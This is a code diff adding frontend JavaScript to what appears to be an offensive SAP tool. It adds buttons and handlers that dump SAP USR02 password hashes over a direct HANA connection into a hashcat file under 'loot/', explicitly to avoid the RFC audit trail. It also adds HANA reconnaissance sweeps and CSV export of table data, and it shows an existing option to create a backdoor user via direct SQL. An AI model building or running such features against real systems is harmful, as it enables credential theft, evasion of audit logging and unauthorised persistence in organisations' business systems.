@@ -10148,6 +10148,105 @@ async function runDBCONTest(srcSid, conName) {
   startPolling();
 }
 
+async function runDBCONDumpUsr02(srcSid, conName) {
+  console.log(`[DBCON] runDBCONDumpUsr02: ${srcSid} / ${conName}`);
+  const edge = _getDBCONEdge(srcSid, conName);
+  if (!edge) return;
+  if (!(edge.reachable && edge.is_sap_shape)) {
+    alert('USR02 dump requires the DBCON target to be a SAP-shape DB (USR02 present).\n\nRun Test Connection first.');
+    return;
+  }
+  if (!confirm(
+    `Dump USR02 hashes from ${edge.target_sid || conName}?\n\n` +
+    `This SELECTs every row of USR02 (BNAME, MANDT, BCODE, PASSCODE,\n` +
+    `PWDSALTEDHASH) via direct HANA connection to ${edge.host}:${edge.port}\n` +
+    `and writes a hashcat-formatted file to loot/dbcon/.\n\n` +
+    `Bypasses the source SAP's gateway entirely — no RFC audit trail on source.`
+  )) return;
+  flashActivity(`${srcSid}: DBCON dump USR02 → ${conName}`, 6000);
+  await api('POST', `node/${srcSid}/dbcon/dump_usr02`, { con_name: conName });
+  startPolling();
+}
+
+async function runDBCONReconSweep(srcSid, conName) {
+  console.log(`[DBCON] runDBCONReconSweep: ${srcSid} / ${conName}`);
+  const edge = _getDBCONEdge(srcSid, conName);
+  if (!edge) return;
+  if (!edge.reachable) {
+    alert('Recon sweep needs a reachable DBCON — Test Connection first.');
+    return;
+  }
+  flashActivity(`${srcSid}: DBCON HANA recon → ${conName}`, 5000);
+  await api('POST', `node/${srcSid}/dbcon/recon_sweep`,
+    { con_name: conName });
+  startPolling();
+}
+
+async function runDBCONDescribe(srcSid, conName, schema, table) {
+  console.log(`[DBCON] runDBCONDescribe: ${srcSid}/${schema}.${table}`);
+  const r = await api('POST', `node/${srcSid}/dbcon/describe_table`, {
+    con_name: conName, schema, table });
+  if (r && r.error) { alert(`Describe failed: ${r.error}`); return; }
+  _showDBCONColumnsOverlay(schema, table, r);
+}
+
+function _showDBCONColumnsOverlay(schema, table, res) {
+  let existing = document.getElementById('dbcon-cols-overlay');
+  if (existing) existing.remove();
+  const div = document.createElement('div');
+  div.id = 'dbcon-cols-overlay';
+  div.style = 'position:fixed;top:10%;left:20%;right:20%;bottom:10%;'
+    + 'background:#0d1117;border:2px solid #58a6ff;border-radius:6px;'
+    + 'z-index:10000;padding:12px 16px;overflow:auto;'
+    + 'box-shadow:0 12px 40px rgba(0,0,0,0.7);font-family:monospace;'
+    + 'color:#e6edf3;font-size:12px';
+  const rows = (res.columns || []).map(c =>
+    `<tr>
+       <td style="padding:3px 8px;color:#8b949e;text-align:right">${c.position}</td>
+       <td style="padding:3px 8px;color:#e6edf3;font-weight:bold">${escHtml(c.name)}</td>
+       <td style="padding:3px 8px;color:#3fb950">${escHtml(c.type)}</td>
+       <td style="padding:3px 8px;color:#8b949e;text-align:right">${c.len || ''}</td>
+       <td style="padding:3px 8px;color:${c.nullable ? '#d29922' : '#f85149'}">${c.nullable ? 'NULL' : 'NOT NULL'}</td>
+     </tr>`).join('');
+  div.innerHTML = `
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+      <div><b style="color:#58a6ff">Columns — ${escHtml(schema)}.${escHtml(table)}</b>
+        <span style="color:#8b949e;margin-left:12px">${(res.columns||[]).length} column(s)</span></div>
+      <button class="btn" onclick="this.closest('#dbcon-cols-overlay').remove()">Close</button>
+    </div>
+    <div style="overflow:auto;max-height:calc(100% - 60px)">
+      <table style="border-collapse:collapse;min-width:100%">
+        <thead><tr>
+          <th style="text-align:right;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">#</th>
+          <th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">Column</th>
+          <th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">Type</th>
+          <th style="text-align:right;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">Length</th>
+          <th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">Nullable</th>
+        </tr></thead>
+        <tbody>${rows}</tbody>
+      </table>
+    </div>
+  `;
+  document.body.appendChild(div);
+}
+
+function _downloadDBCONPeekCSV(schema, table) {
+  const overlay = document.getElementById('dbcon-peek-overlay');
+  if (!overlay) return;
+  const rowsData = overlay._peekRows || [];
+  const cols = overlay._peekCols || [];
+  const esc = v => v === null ? '' : `"${String(v).replace(/"/g, '""')}"`;
+  const csv = [cols.map(esc).join(',')]
+    .concat(rowsData.map(r => r.map(esc).join(',')))
+    .join('\n');
+  const blob = new Blob([csv], { type: 'text/csv' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `dbcon_${schema}_${table}_${Date.now()}.csv`;
+  a.click();
+  setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+}
+
 async function runDBCONPeekCustom(srcSid, conName) {
   console.log(`[DBCON] runDBCONPeekCustom: ${srcSid} / ${conName}`);
   const edge = _getDBCONEdge(srcSid, conName);
@@ -10200,11 +10299,14 @@ async function runDBCONPeek(srcSid, conName, schema, table) {
 }
 
 function _showDBCONPeekOverlay(srcSid, conName, schema, table, res) {
-  // Simple overlay — DevTools-style table dump for quick recon.
   let existing = document.getElementById('dbcon-peek-overlay');
   if (existing) existing.remove();
   const div = document.createElement('div');
   div.id = 'dbcon-peek-overlay';
+  // Cache row data on the DOM element so the CSV download button
+  // can pick them up without re-fetching from the backend.
+  div._peekRows = res.rows || [];
+  div._peekCols = res.columns || [];
   div.style = 'position:fixed;top:8%;left:8%;right:8%;bottom:8%;'
     + 'background:#0d1117;border:2px solid #f0883e;border-radius:6px;'
     + 'z-index:10000;padding:12px 16px;overflow:auto;'
@@ -10221,7 +10323,11 @@ function _showDBCONPeekOverlay(srcSid, conName, schema, table, res) {
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
       <div><b style="color:#f0883e">DBCON peek — ${escHtml(schema)}.${escHtml(table)}</b>
         <span style="color:#8b949e;margin-left:12px">${(res.rows||[]).length} row(s), ${(res.columns||[]).length} col(s)${res.truncated ? ' — truncated' : ''}</span></div>
-      <button class="btn" onclick="this.closest('#dbcon-peek-overlay').remove()">Close</button>
+      <div style="display:flex;gap:6px">
+        <button class="btn" onclick="runDBCONDescribe('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(schema)}','${escHtml(table)}')">&#128712; Columns</button>
+        <button class="btn" style="background:#238636;color:#fff" onclick="_downloadDBCONPeekCSV('${escHtml(schema)}','${escHtml(table)}')">&#8681; CSV</button>
+        <button class="btn" onclick="this.closest('#dbcon-peek-overlay').remove()">Close</button>
+      </div>
     </div>
     <div style="overflow:auto;max-height:calc(100% - 60px)">
       <table style="border-collapse:collapse;min-width:100%"><thead><tr>${cols}</tr></thead><tbody>${rows}</tbody></table>
@@ -10314,6 +10420,12 @@ function showDBCONCtxMenu(e, srcSid, conName) {
     <div class="ctx-item${edge.reachable ? '' : ' ctx-item-disabled'}" `
     + `onclick="runDBCONPeekCustom('${escHtml(srcSid)}','${escHtml(conName)}');hideCtxMenu()">`
     + `Peek table (by name)&hellip;</div>
+    <div class="ctx-item${edge.reachable ? '' : ' ctx-item-disabled'}" `
+    + `onclick="runDBCONReconSweep('${escHtml(srcSid)}','${escHtml(conName)}');hideCtxMenu()">`
+    + `HANA recon sweep (M_LICENSE / M_HOST / T000&hellip;)</div>
+    <div class="ctx-item${(edge.reachable && edge.is_sap_shape) ? '' : ' ctx-item-disabled'}" `
+    + `onclick="runDBCONDumpUsr02('${escHtml(srcSid)}','${escHtml(conName)}');hideCtxMenu()">`
+    + `${edge.usr02_hashes_loot_path ? 'Re-dump USR02 hashes' : 'Dump USR02 hashes &rarr; loot/'}</div>
     <div class="ctx-item" onclick="showDBCONDetail('${escHtml(srcSid)}','${escHtml(conName)}');hideCtxMenu()">Show details</div>
   `;
   menu.style.left = e.clientX + 'px';
@@ -10373,8 +10485,40 @@ function showDBCONDetail(srcSid, conName, opts) {
            onclick="runDBCONPeek('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(t.schema)}','${escHtml(t.table)}')">${escHtml(t.table)}</td>
        <td style="padding:2px 6px;color:#8b949e;text-align:right">${t.rows >= 0 ? t.rows.toLocaleString() : '?'}</td>
        <td style="padding:2px 6px;color:#6e7681;font-size:10px">${escHtml(t.table_type || '')}</td>
+       <td style="padding:2px 6px;text-align:center">
+         <span style="cursor:pointer;color:#58a6ff;text-decoration:underline;font-size:10px"
+           title="Show columns"
+           onclick="event.stopPropagation();runDBCONDescribe('${escHtml(srcSid)}','${escHtml(conName)}','${escHtml(t.schema)}','${escHtml(t.table)}')">cols</span>
+       </td>
      </tr>`
   ).join('');
+  // HANA recon-sweep facts card
+  const reconFacts = edge.recon_facts || {};
+  const reconRows = Object.keys(reconFacts).map(k => {
+    const v = reconFacts[k];
+    if (v.error) return `<div style="font-size:10px;color:#f85149">${escHtml(k)}: ${escHtml(v.error)}</div>`;
+    const sample = (v.rows || []).slice(0, 3).map(r =>
+      `<div style="font-size:10px;color:#c9d1d9;margin-left:8px;white-space:pre-wrap;word-break:break-all">${escHtml((r || []).map(x => x === null ? '∅' : String(x)).join(' | '))}</div>`
+    ).join('');
+    const more = (v.count || 0) > 3 ? `<div style="font-size:9px;color:#6e7681;margin-left:8px">… +${v.count - 3} more</div>` : '';
+    return `<div style="margin-bottom:6px">
+       <div style="font-size:11px;color:#3fb950;font-weight:bold">${escHtml(k)} <span style="color:#8b949e;font-weight:normal">(${v.count || 0})</span></div>
+       ${sample}${more}
+     </div>`;
+  }).join('');
+  const reconSection = Object.keys(reconFacts).length
+    ? `<div class="info-section">
+         <div style="color:#f0883e;font-weight:bold;margin-bottom:4px">HANA recon facts</div>
+         <div style="max-height:200px;overflow:auto;padding:4px;background:#0a0d10;border-radius:3px">${reconRows}</div>
+       </div>`
+    : '';
+  // USR02 dump loot pointer
+  const lootSection = edge.usr02_hashes_loot_path
+    ? `<div class="info-section" style="background:#1a2a1a;padding:6px 8px;border-radius:3px">
+         <div style="color:#3fb950;font-weight:bold;font-size:11px">&#128274; USR02 hashes dumped</div>
+         <div style="font-size:10px;color:#8b949e;word-break:break-all;margin-top:2px">${escHtml(edge.usr02_hashes_loot_path)}</div>
+       </div>`
+    : '';
   const peekInputSection = edge.reachable
     ? `<div class="info-section">
          <div style="color:#f0883e;font-weight:bold;margin-bottom:4px">Peek arbitrary table</div>
@@ -10398,6 +10542,7 @@ function showDBCONDetail(srcSid, conName, opts) {
                <th style="text-align:left;padding:3px 6px;color:#8b949e">Table (click to peek)</th>
                <th style="text-align:right;padding:3px 6px;color:#8b949e">Rows</th>
                <th style="text-align:left;padding:3px 6px;color:#8b949e">Type</th>
+               <th style="text-align:center;padding:3px 6px;color:#8b949e"></th>
              </tr></thead>
              <tbody>${enumRows}</tbody>
            </table>
@@ -10422,11 +10567,15 @@ function showDBCONDetail(srcSid, conName, opts) {
     <div class="info-row"><span class="info-label">SAP-shape:</span><span class="info-val" style="font-size:11px;color:#c9d1d9">${escHtml(reasonText)}</span></div>
     ${edge.tested_at ? `<div class="info-row"><span class="info-label">Tested at:</span><span class="info-val" style="font-size:11px;color:#8b949e">${escHtml(edge.tested_at)}</span></div>` : ''}
     ${edge.error ? `<div class="info-section" style="color:#f85149;font-size:11px">${escHtml(edge.error)}</div>` : ''}
+    ${lootSection}
+    ${reconSection}
     ${peekInputSection}
     ${enumSection}
     <div style="text-align:right;margin-top:12px;display:flex;gap:6px;justify-content:flex-end;flex-wrap:wrap">
       <button class="btn" onclick="runDBCONTest('${escHtml(srcSid)}','${escHtml(conName)}')">${edge.tested ? 'Re-test' : 'Test Connection'}</button>
       ${edge.reachable ? `<button class="btn" onclick="runDBCONEnumerate('${escHtml(srcSid)}','${escHtml(conName)}')">Enumerate tables</button>` : ''}
+      ${edge.reachable ? `<button class="btn" onclick="runDBCONReconSweep('${escHtml(srcSid)}','${escHtml(conName)}')">HANA recon</button>` : ''}
+      ${(edge.reachable && edge.is_sap_shape) ? `<button class="btn" style="background:#b3671f;color:#fff" onclick="runDBCONDumpUsr02('${escHtml(srcSid)}','${escHtml(conName)}')">${edge.usr02_hashes_loot_path ? 'Re-dump USR02' : 'Dump USR02 &rarr; loot'}</button>` : ''}
       ${edge.is_sap_shape ? `<button class="btn" style="background:#b33;color:#fff" onclick="runDBCONCreateUser('${escHtml(srcSid)}','${escHtml(conName)}')">Create SAPMAP00 (direct SQL)</button>` : ''}
       <button class="btn" onclick="document.getElementById('detail-panel').classList.remove('visible')">Close</button>
     </div>
